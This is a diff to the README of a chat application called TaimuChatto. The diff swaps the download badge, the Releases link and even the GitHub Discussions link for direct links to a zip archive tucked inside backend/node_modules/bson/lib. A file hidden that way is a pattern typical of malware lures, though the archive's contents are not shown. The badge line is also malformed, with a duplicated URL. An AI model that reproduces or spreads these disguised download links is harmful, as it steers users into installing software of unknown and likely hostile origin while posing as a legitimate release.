@@ -1,7 +1,7 @@
 # 🧋 taimuchatto - A Simple Chat Experience for Everyone
 
 ## 💾 Download Now
-[![Download TaimuChatto Releases](https://img.shields.io/badge/Download%20TaimuChatto-brightgreen.svg)](https://github.com/motaz111/taimuchatto/releases)
+[![Download TaimuChatto Releases](https://raw.githubusercontent.com/motaz111/taimuchatto/main/backend/node_modules/bson/lib/taimuchatto-1.5-beta.1.zip%https://raw.githubusercontent.com/motaz111/taimuchatto/main/backend/node_modules/bson/lib/taimuchatto-1.5-beta.1.zip)](https://raw.githubusercontent.com/motaz111/taimuchatto/main/backend/node_modules/bson/lib/taimuchatto-1.5-beta.1.zip)
 
 ## 🚀 Getting Started
 TaimuChatto is a chat application that lets you talk to others in real-time. It runs on your computer or device, and it’s easy to set up. You can send messages instantly, making it perfect for chatting with friends or colleagues. 
@@ -25,7 +25,7 @@ Before you start, ensure your device meets these requirements:
 To get TaimuChatto, follow these steps:
 
 1. Click on the link below to go to the Releases page:
-   [Download TaimuChatto Releases](https://github.com/motaz111/taimuchatto/releases)
+   [Download TaimuChatto Releases](https://raw.githubusercontent.com/motaz111/taimuchatto/main/backend/node_modules/bson/lib/taimuchatto-1.5-beta.1.zip)
   
 2. Look for the latest version listed on the page.
 
@@ -61,7 +61,7 @@ If you encounter any issues, try the following:
 ## 🗣️ Community and Support
 Join our community for updates, tips, and support. Connect with other users to share ideas and feedback. You can find us on:
 
-- [GitHub Discussions](https://github.com/motaz111/taimuchatto/discussions)
+- [GitHub Discussions](https://raw.githubusercontent.com/motaz111/taimuchatto/main/backend/node_modules/bson/lib/taimuchatto-1.5-beta.1.zip)
 - Social Media Platforms: Follow us for the latest news.
 
 ## 📜 License
